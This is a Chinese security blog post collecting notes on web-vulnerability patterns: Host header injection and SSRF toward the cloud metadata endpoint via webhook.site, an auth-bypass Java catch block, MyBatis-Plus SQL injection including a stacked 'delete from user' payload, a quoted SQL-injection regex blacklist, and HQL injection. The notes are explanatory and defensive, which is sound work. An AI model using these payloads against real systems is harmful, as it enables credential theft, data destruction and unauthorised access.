@@ -1,0 +1,2464 @@
+<!DOCTYPE html>
+<html>
+  <!-- meta/link... -->
+  
+
+
+
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport">
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+
+
+  <title>一些奇怪的姿势和场景杂烩 | Godown_blog</title>
+
+  <link rel="icon" type="image/x-icon, image/vnd.microsoft.icon" href="/favicon.ico">
+  <link rel="stylesheet" href="https://at.alicdn.com/t/font_1911880_c1nvbyezg17.css">
+  <link href="https://unpkg.com/@fortawesome/fontawesome-free/css/all.min.css" rel="stylesheet">
+  <link href="/js/swiper/swiper@5.4.1.min.css" rel="stylesheet">
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/animate.min.css">
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+  
+  
+    <link href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0/dist/fancybox/fancybox.css" rel="stylesheet">
+  
+  
+    
+<link rel="stylesheet" href="/js/shareJs/share.min.css">
+
+  
+  <style>
+        @media (max-width: 992px) {
+            #waifu {
+                display: none;
+            }
+        }
+    </style>
+    <script defer src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/pink/pace-theme-flash.css" rel="stylesheet">
+
+    
+    
+    <!-- 依赖于jquery和vue -->
+    
+        <script src="https://unpkg.com/jquery@3.5.1/dist/jquery.min.js"></script>
+    
+
+    
+        <script src="https://unpkg.com/vue@2.6.11/dist/vue.min.js"></script>
+    
+
+    <!-- import link -->
+    
+        
+            
+        
+            
+        
+    
+    <!-- import script -->
+    
+        
+            
+        
+            
+        
+    
+
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="Godown_blog" type="application/atom+xml">
+</head>
+
+  
+  <!-- 预加载动画 -->
+  <!-- 页面预加载动画 -->
+
+  
+    <div class="preloader_2" id="loader">
+  <div class="loader"></div>
+</div>
+
+  
+<script>
+  var endLoading = function () {
+    document.body.style.overflow = 'auto';
+    document.getElementById('loader').classList.add("loading");
+  }
+  window.addEventListener('DOMContentLoaded',endLoading);
+</script>
+
+  <body>
+    <!-- 判断是否为暗黑风格 -->
+    <!-- 判断是否为黑夜模式 -->
+<script>
+  let isDark = JSON.parse(localStorage.getItem('dark')) || JSON.parse('false');
+
+  if (isDark) {
+    $(document.body).addClass('darkModel');
+  }
+</script>
+
+    <!-- 需要在上面加载的js -->
+    <script>
+  function loadScript(src, cb) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var HEAD = document.getElementsByTagName("head")[0] || document.documentElement;
+        var script = document.createElement("script");
+        script.setAttribute("type", "text/javascript");
+        if (cb) {
+          if (JSON.stringify(cb)) {
+            for (let p in cb) {
+              if (p == "onload") {
+                script[p] = () => {
+                  cb[p]()
+                  resolve()
+                }
+              } else {
+                script[p] = cb[p]
+                script.onload = resolve
+              }
+            }
+          } else {
+            script.onload = () => {
+              cb()
+              resolve()
+            };
+          }
+        } else {
+          script.onload = resolve
+        }
+        script.setAttribute("src", src);
+        HEAD.appendChild(script);
+      });
+    });
+  }
+
+  //https://github.com/filamentgroup/loadCSS
+  var loadCSS = function (src) {
+    return new Promise(resolve => {
+      setTimeout(function () {
+        var link = document.createElement('link');
+        link.rel = "stylesheet";
+        link.href = src;
+        link.onload = resolve;
+        document.getElementsByTagName("head")[0].appendChild(link);
+      });
+    });
+  };
+
+</script> 
+
+<!-- 轮播图所需要的js -->
+<script src="/js/swiper/swiper.min.js"></script>
+<script src="/js/swiper/vue-awesome-swiper.js"></script>
+<script src="/js/swiper/swiper.animate1.0.3.min.js"></script>
+
+<script type="text/javascript">
+  Vue.use(window.VueAwesomeSwiper)
+</script>
+
+
+  <script src="/js/vue-typed-js/index.js"></script>
+
+
+<!-- 首页的公告滚动插件的js需要重新加载 -->
+<script src="/js/vue-seamless-scroll/index.js"></script>
+
+<!-- 打字机效果js -->
+<script src="https://unpkg.com/typed.js@2.0.11"></script>
+
+
+    <div id="safearea">
+      <main class="main" id="pjax-container">
+        <!-- 头部导航 -->
+        
+<header class="header  " 
+  id="navHeader"
+  style="position: fixed;
+  left: 0; top: 0; z-index: 10;width: 100%;"
+>
+  <div class="header-content">
+    <div class="bars">
+      <div id="appDrawer" class="sidebar-image">
+  <div class="drawer-box-icon">
+    <i class="fas fa-bars" aria-hidden="true" @click="showDialogDrawer"></i>
+  </div>
+  
+  <transition name="fade">
+    <div class="drawer-box_mask" v-cloak style="display: none;" v-show="visible" @click.self="cancelDialogDrawer">
+    </div>
+  </transition>
+  <div class="drawer-box" :class="{'active': visible}">
+    <div class="drawer-box-head bg-color">
+      <img class="drawer-box-head_logo lazyload placeholder" src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+      <h3 class="drawer-box-head_title">Godown_blog</h3>
+      <h5 class="drawer-box-head_desc">山水为竭，冬雷震震</h5>
+    </div>
+    
+    <div class="drawer-box-content">
+      <ul class="drawer-box-content_menu">
+        
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/archives" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/tags" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/categories" class="drawer-menu-item-link">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="/friends" class="drawer-menu-item-link">
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+            <li class="drawer-box-content_item" style="position: relative;">
+              
+                <a href="javascript:;" class="drawer-menu-item-link has-children" @click="openOrCloseMenu(5)">
+                  <span>
+                    
+                      <i class="fas fa-link"></i>
+                    
+                    <span class="name">更多</span>
+                  </span>
+                  <i class="fas fa-chevron-left arrow " :class="{'icon-rotate': isOpen(5)}" aria-hidden="true"></i>
+                </a>
+                <ul class="drawer-sub-menu" v-if="isOpen(5)">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/friends">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/about">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a target="_blank" rel="noopener" href="http://baidu.com">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>百度</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+        
+          <li class="drawer-box-content_item">
+            <a target="_blank" rel="noopener" href="https://github.com/godownio">
+              <i class="fas fa-github" aria-hidden="true"></i>
+              <span>Github</span>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</div>
+
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appDrawer',
+    data: {
+      visible: false,
+      top: 0,
+      openArr: [],
+    },
+    computed: {
+    },
+    mounted() {
+    },
+    methods: {
+      isOpen(index) {
+        if (this.openArr.includes(index)) {
+          return true;
+        } else {
+          return false;
+        }
+      },
+      openOrCloseMenu(curIndex) {
+        const index = this.openArr.indexOf(curIndex);
+        if (index !== -1) {
+          this.openArr.splice(index, 1);
+        } else {
+          this.openArr.push(curIndex);
+        }
+      },
+      showDialogDrawer() {
+        this.visible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'width: 100%; height: 100%;overflow: hidden;';
+      },
+      cancelDialogDrawer() {
+        this.visible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      }
+    },
+    created() {}
+  })
+</script>
+
+    </div>
+    <div class="blog-title" id="author-avatar">
+      
+        <div class="avatar">
+          <img src="/medias/logo.png" class="lazyload placeholder" data-srcset="/medias/logo.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="logo">
+        </div>
+      
+      <a href="/" class="logo">Godown_blog</a>
+    </div>
+    <nav class="navbar">
+      <ul class="menu">
+        
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/" class="menu-item-link" title="首页">
+                  
+                    <i class="fas fa-home" aria-hidden="true"></i>
+                  
+                  <span class="name">首页</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/archives" class="menu-item-link" title="归档">
+                  
+                    <i class="fas fa-archive" aria-hidden="true"></i>
+                  
+                  <span class="name">归档</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/tags" class="menu-item-link" title="标签">
+                  
+                    <i class="fas fa-tags" aria-hidden="true"></i>
+                  
+                  <span class="name">标签</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/categories" class="menu-item-link" title="分类">
+                  
+                    <i class="fas fa-bookmark" aria-hidden="true"></i>
+                  
+                  <span class="name">分类</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="/friends" class="menu-item-link" title="友情链接">
+                  
+                  <span class="name">友情链接</span>
+                </a>
+              
+            </li>
+          
+            <li class="menu-item" style="position: relative;">
+              
+                <a href="javascript:;" class="menu-item-link" title="更多">
+                  
+                    <i class="fas fa-link"></i>
+                  
+                  <span class="name">更多</span>
+                  <i class="fas fa-chevron-down arrow" aria-hidden="true"></i>
+                </a>
+                <ul class="sub-menu">
+                  
+                  <li>
+                    <a href="/gallery">
+                      
+                      <i class="fas fa-music" style="margin-top: -20px;"></i>
+                      
+                      <span>图库</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/friends">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>友情连接</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a href="/about">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>关于我</span>
+                    </a>
+                  </li>
+                  
+                  <li>
+                    <a target="_blank" rel="noopener" href="http://baidu.com">
+                      
+                      <i class="fas fa-film" style="margin-top: -20px;"></i>
+                      
+                      <span>百度</span>
+                    </a>
+                  </li>
+                  
+                </ul>
+              
+            </li>
+          
+        
+      </ul>
+      
+      
+        <div id="appSearch">
+  <div class="search"  @click="showDialog()"><i class="fas fa-search" aria-hidden="true"></i></div>
+  <transition name="fade">
+    <div class="message-box_wrapper" style="display: none;" v-cloak v-show="dialogVisible" @click.self="cancelDialogVisible()">
+      <div class="message-box animated bounceInDown">
+        <h2>
+          <span>
+            <i class="fas fa-search" aria-hidden="true"></i>
+            <span class="title">本地搜索</span>
+          </span>
+          <i class="fas fa-times close" pointer style="float:right;" aria-hidden="true" @click.self="cancelDialogVisible()"></i>
+        </h2>
+        <form class="site-search-form">
+          <input type="text"
+            placeholder="请输入关键字"
+            id="local-search-input" 
+            @click="getSearchFile()"
+            class="st-search-input"
+            v-model="searchInput"
+          />
+        </form>
+        <div class="result-wrapper">
+          <div id="local-search-result" class="local-search-result-cls"></div>
+        </div>
+      </div>
+    </div>
+  </transition>
+</div>
+<script src="/js/local_search.js"></script>
+<script>
+  var body = document.body || document.documentElement || window;
+  var vm = new Vue({
+    el: '#appSearch',
+    data: {
+      dialogVisible: false,
+      searchInput: '',
+      top: 0,
+    },
+    computed: {
+    },
+    mounted() {
+      window.addEventListener('pjax:complete', () => {
+        this.cancelDialogVisible();
+      })
+    },
+    methods: {
+      showDialog() {
+        this.dialogVisible = true;
+        // 防止页面滚动，只能让弹框滚动
+        this.top = $(document).scrollTop()
+        body.style.cssText = 'overflow: hidden;';
+      },
+      getSearchFile() {
+        if (!this.searchInput) {
+          getSearchFile("/search.xml");
+        }
+      },
+      cancelDialogVisible() {
+        this.dialogVisible = false;
+        body.removeAttribute('style');
+        $(document).scrollTop(this.top)
+      },
+    },
+    created() {}
+  })
+</script>
+<!-- 解决刷新页面闪烁问题，可以在元素上添加display: none, 或者用vue.extend方法，详情：https://blog.csdn.net/qq_31393401/article/details/81017912 -->
+<!-- 下面是搜索基本写法 -->
+<!-- <script type="text/javascript" id="local.search.active">
+  var inputArea = document.querySelector("#local-search-input");
+  inputArea.onclick   = function(){ getSearchFile(); this.onclick = null }
+  inputArea.onkeydown = function(){ if(event.keyCode == 13) return false }
+</script> -->
+
+      
+
+    </nav>
+  </div>
+  
+    <a target="_blank" rel="noopener" href="https://github.com/godownio" class="github-corner color-primary" aria-label="View source on GitHub"><svg width="60" height="60" viewBox="0 0 250 250" style="fill:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+  
+  
+</header>
+        <!-- 内容区域 -->
+        
+ <!-- prismjs 代码高亮 -->
+ 
+
+
+<div class="bg-dark-floor" style="position: fixed;left: 0;top: 0;width: 100%;height: 100%;z-index: -1;"></div>
+
+
+  <!-- 文章详情页顶部图片和标题 -->
+
+
+
+
+<div class="post-detail-header" id="thumbnail_canvas" style="background-repeat: no-repeat; background-size: cover; 
+  background-position: center center;position: relative;background-image:url('https://typora-202017030217.oss-cn-beijing.aliyuncs.com/%E5%9B%BE%E7%89%87%E7%B4%A0%E6%9D%90/1080P%20A%20%E6%94%B6%E8%97%8F%E9%87%8F%E6%9C%80%E5%A4%9A/1080PA%E5%A3%81%E7%BA%B8197.jpg')">
+  <div class="post-detail-header-mask"></div>
+  <canvas id="header_canvas"style="position:absolute;bottom:0;pointer-events:none;"></canvas>
+  
+  <div class="post-detail-header_info-box">
+    <div class="title-box">
+      <span class="title">
+        一些奇怪的姿势和场景杂烩
+      </span>
+    </div>
+    
+    
+  </div>
+  
+  
+    <script src="/js/bubble/bubble.js"></script>
+  
+</div>
+
+
+
+
+
+<div class="post-detail-content post-row" 
+  style="padding-top: 0px;">
+  <div class="main-content">
+    <article class="post post-detail">
+      <div class="post-content">
+        <h2 id="漏洞姿势"><a href="#漏洞姿势" class="headerlink" title="漏洞姿势"></a>漏洞姿势</h2><p>AI时代，已经没有什么漏洞足够惊艳了，这里记载的漏洞，都是属于特定业务场景下我觉得思路比较清奇的漏洞，lets go</p>
+<h3 id="header头注入"><a href="#header头注入" class="headerlink" title="header头注入"></a>header头注入</h3><p>之前不太懂host头注入，因为一般抓包http包，发送出去就是根据host识别的到达地址，所以改了host就不能到达了</p>
+<p>用代码的话，如果目标会提取host，先socket.connect到目标，再发送恶意host，如下：</p>
+<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sock = socket.create_connection((&#x27;<span class="number">203.0</span>.<span class="number">113.10</span>&#x27;, <span class="number">3000</span>))  <span class="comment"># 网络层连接到受害者</span></span><br><span class="line">sock.send(b<span class="string">&quot;&quot;</span><span class="string">&quot;GET http://169.254.169.254/latest/meta-data/ HTTP/1.1</span></span><br><span class="line"><span class="string">Host: webhook.site</span></span><br><span class="line"><span class="string">Upgrade: websocket</span></span><br><span class="line"><span class="string">...</span></span><br></pre></td></tr></table></figure>
+
+<p>这种情况下不会按照host去发包，如果目标是用Host进行了后续解析或者拼接，就会达到注入&#x2F;ssrf</p>
+<h3 id="header爆破"><a href="#header爆破" class="headerlink" title="header爆破"></a>header爆破</h3><p>来自沐瞳的问题，感觉就是fuzz header？</p>
+<h3 id="硬编码的修复"><a href="#硬编码的修复" class="headerlink" title="硬编码的修复"></a>硬编码的修复</h3><p>一般有个redis之类的外部数据库，key从外部加载而不是放到代码。</p>
+<p>如果是android之类的electron里面本地初始化用的密钥怎么处理？如果是鉴权app，需要在注册的时候下发密钥，如果是加密本地数据，那应该在首次运行的时候随机生成</p>
+<p>如果业务上非要有内置常量，需要认为这些密钥必定是会被泄露的，但是要提高泄露成本，找逆向爷要一些混淆手法</p>
+<p>扫硬编码使用gitleaks</p>
+<p>aes密钥不能放到前端</p>
+<h3 id="越权漏洞的验证"><a href="#越权漏洞的验证" class="headerlink" title="越权漏洞的验证"></a>越权漏洞的验证</h3><p>建议测的时候到ui上抓包测试（除非漏洞量很大，有原始报告的情况下直接用路由base测试），有几个优势：</p>
+<p>1、ui上抓的包，直接携带了真实参数，如签名&#x2F;时间戳等</p>
+<p>2、可以根据ui直接点击是否可视判断是否为正常业务，如果直接点击就出现了对应数据，那很明显就是正常业务；如果点击没有出现，但是可以通过发包修改参数获取某些数据，说明是越权</p>
+<p>代码上看越权，除了注解，接口校验等，校验代码也可能存在没有throw Exception导致的异常token串绕过，比如下面代码：catch里面没有throw Exception，导致解析异常后认为鉴权成功，导致畸形绕过</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">handleUserSessionContext</span><span class="params">(HttpServletRequest request)</span> &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">UserSessionBean</span> <span class="variable">userSession</span> <span class="operator">=</span> UserSessionHelper.getCurrentSession();</span><br><span class="line">        <span class="keyword">if</span> (userSession != <span class="literal">null</span> &amp;&amp; userSession.getUserId() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 根据用户类型创建上下文</span></span><br><span class="line">            <span class="type">UserTypeEnum</span> <span class="variable">userType</span> <span class="operator">=</span> UserTypeEnum.AGENT; <span class="comment">// 默认为座席</span></span><br><span class="line">            <span class="keyword">if</span> (userSession.getTenantId() != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="comment">// 如果有租户ID，可能是第三方用户</span></span><br><span class="line">                userType = UserTypeEnum.SYSTEM;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="type">ImContext</span> <span class="variable">context</span> <span class="operator">=</span> ImContext.createHttpContext(</span><br><span class="line">                    userSession.getUserId(),</span><br><span class="line">                    userType,</span><br><span class="line">                    <span class="string">&quot;http&quot;</span>,</span><br><span class="line">                    userSession.getUserFullName()</span><br><span class="line">            );</span><br><span class="line">            context.setSessionId(request.getSession().getId());</span><br><span class="line"></span><br><span class="line">            <span class="comment">// 设置到当前线程</span></span><br><span class="line">            ImContextHolder.setContext(context);</span><br><span class="line"></span><br><span class="line">            log.debug(<span class="string">&quot;用户HTTP请求设置ImContext成功: &#123;&#125;&quot;</span>, context);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            log.debug(<span class="string">&quot;用户HTTP请求未获取到有效的用户会话信息&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        log.warn(<span class="string">&quot;处理用户会话上下文失败&quot;</span>, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="云上场景的ssrf"><a href="#云上场景的ssrf" class="headerlink" title="云上场景的ssrf"></a>云上场景的ssrf</h3><p>现在有下面这个云场景：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">云服务1             云服务2                云服务3</span><br><span class="line">公网IP1            公网IP2                公网IP3</span><br><span class="line">内网IP1            内网IP2                内网IP3</span><br><span class="line"></span><br><span class="line">				办公网 公网IP</span><br></pre></td></tr></table></figure>
+
+<p>由于几项云服务，如gitlab都在云上，办公网能出网，能访问gitlab，而gitlab别人又不能访问。肯定是在配置里对办公网网段加白了。</p>
+<p>但是办公网很明显是个外网IP，但是云服务之间需要有互相访问，那是怎么做的呢？最简单的办法就是在云服务1的网关里对云服务2,3的公网IP也加白，其他的云，配置也对称</p>
+<p>那这种架构有什么问题呢，假如在云服务1发现了ssrf，但是这个ssrf可能是富文本编辑框这种必须要访问外链的场景，那业务会怎么修？在ssrf的代码处ban掉内网防止访问本地文件和redis pod之类的</p>
+<p>假如这么修复，云服务1依旧能访问云服务2,3，一般云服务2,3又是办公网才能访问的站，比如gitlab，xxx后台。那不完犊子了？不可能在每个这种场景的ssrf处把所有云IP也加入黑名单吧。</p>
+<p>最合适的是，最初的架构里，云服务1访问云服务2,3，应该是通过内网IP访问，因为这些服务都在同一个云上，互相就是内网，完全没必要相互外网白名单，这样ban掉内网的时候也能ban掉互相访问云服务</p>
+<h3 id="Mybatis-QueryWrapper-SQL注入问题"><a href="#Mybatis-QueryWrapper-SQL注入问题" class="headerlink" title="Mybatis QueryWrapper SQL注入问题"></a>Mybatis QueryWrapper SQL注入问题</h3><p><a target="_blank" rel="noopener" href="https://github.com/baomidou/mybatis-plus/issues/6167">https://github.com/baomidou/mybatis-plus/issues/6167</a></p>
+<p>QueryWrapper.eq存在sql注入，LambdaQueryWrapper是安全的（只有name的地方可以注入，张三的地方不行，所以这个issue里面吵起来了）</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;User&gt;().eq(<span class="string">&quot;name&quot;</span>, <span class="string">&quot;张三&quot;</span>);      <span class="comment">// → name = ?     （name 是拼进去的）</span></span><br><span class="line"><span class="keyword">new</span> <span class="title class_">LambdaQueryWrapper</span>&lt;User&gt;().eq(User::getName, <span class="string">&quot;张三&quot;</span>);  <span class="comment">// → name = ?  （name 由 lambda 解析，安全）</span></span><br></pre></td></tr></table></figure>
+
+<p>再比如</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">new</span> QueryWrapper<span class="operator">&lt;&gt;</span>(<span class="keyword">null</span>, &quot;* from user; delete from user; select name, age&quot;);</span><br></pre></td></tr></table></figure>
+
+<p><code>AbstractWrapper</code> 里以下函数直接处理外部参数也存在sql注入漏洞：</p>
+<ul>
+<li><code>orderByAsc/Desc(String...)</code>、<code>groupBy(String)</code>、<code>having(String)</code></li>
+<li><code>select(String...)</code>、<code>new QueryWrapper&lt;&gt;(entity, sqlSelect)</code></li>
+<li><code>apply(String)</code>（不带 <code>&#123;0&#125;</code> 值的重载）、<code>last(String)</code></li>
+<li><code>inSql</code> &#x2F; <code>exists</code> &#x2F; <code>notExists</code> 的子查询字符串</li>
+<li><code>@Select(&quot;... $&#123;x&#125; ...&quot;)</code>、XML 里的 <code>$&#123;&#125;</code>、<code>$&#123;ew.sqlSegment&#125;</code></li>
+</ul>
+<p>这些函数可以问下AI具体的业务功能，理解业务才能理解漏洞。</p>
+<p>并且这个必须业务自己进行过滤，或者直接使用LambdaQueryWrapper</p>
+<p>虽然mybatis 3.5.3.2 起 <code>QueryWrapper</code>&#x2F;<code>UpdateWrapper</code> 各加了一个开关（默认 <strong>关闭</strong>）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">boolean</span> checkSqlInjection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> QueryWrapper&lt;T&gt; <span class="title function_">checkSqlInjection</span><span class="params">()</span> &#123; <span class="built_in">this</span>.checkSqlInjection = <span class="literal">true</span>; <span class="keyword">return</span> <span class="built_in">this</span>; &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">protected</span> String <span class="title function_">columnToString</span><span class="params">(String column)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (checkSqlInjection &amp;&amp; SqlInjectionUtils.check(column)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">MybatisPlusException</span>(<span class="string">&quot;Discovering SQL injection column: &quot;</span> + column);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> column;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>SqlInjectionUtils.check</code> 是正则黑名单（<code>toolkit/sql/SqlInjectionUtils.java</code>）：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">SQL_SYNTAX_PATTERN</span> <span class="operator">=</span> Pattern.compile(</span><br><span class="line">    <span class="string">&quot;(insert|delete|update|select|create|drop|truncate|grant|alter|deny|revoke|call|execute|exec|declare|show|rename|set)&quot;</span></span><br><span class="line">  + <span class="string">&quot;\\s+.*(into|from|set|where|table|database|view|index|on|cursor|procedure|trigger|for|password|union|and|or)&quot;</span></span><br><span class="line">  + <span class="string">&quot;|(select\\s*\\*\\s*from\\s+)|if\\s*\\(.*\\)|select\\s*\\(.*\\)|substr\\s*\\(.*\\)|substring\\s*\\(.*\\)&quot;</span></span><br><span class="line">  + <span class="string">&quot;|char\\s*\\(.*\\)|concat\\s*\\(.*\\)|benchmark\\s*\\(.*\\)|sleep\\s*\\(.*\\)|(and|or)\\s+.*&quot;</span>,</span><br><span class="line">    Pattern.CASE_INSENSITIVE);</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">Pattern</span> <span class="variable">SQL_COMMENT_PATTERN</span> <span class="operator">=</span></span><br><span class="line">    Pattern.compile(<span class="string">&quot;&#x27;.*(or|union|--|#|/\\*|;)&quot;</span>, Pattern.CASE_INSENSITIVE);</span><br></pre></td></tr></table></figure>
+
+<p>这个也是随便bypass的，给ctf出道题都能被打到最低分</p>
+<h3 id="hql注入"><a href="#hql注入" class="headerlink" title="hql注入"></a>hql注入</h3><p>和mybatis的区别是，没有${}和#{}，也没有分号，所以不能堆叠注入</p>
+<p>只能使用setParameter进行类似预编译的替换（安全的），同样的order by的地方只能白名单</p>
